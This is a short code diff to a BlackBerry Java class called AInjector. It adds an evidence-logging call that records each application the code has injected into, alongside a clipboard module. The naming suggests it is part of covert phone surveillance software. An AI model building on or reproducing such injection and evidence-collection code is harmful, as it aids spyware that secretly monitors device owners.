@@ -14,6 +14,7 @@ import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
 import blackberry.module.ModuleClipboard;
 
 public abstract class AInjector {
@@ -58,6 +59,7 @@ public abstract class AInjector {
         debug.trace("setInjectedApp: INJECTED");
         //#endif
         this.injectedApp = app;
+        Evidence.info("INJ: " + getAppName());
     }
 
     public UiApplication getInjectedApp() {
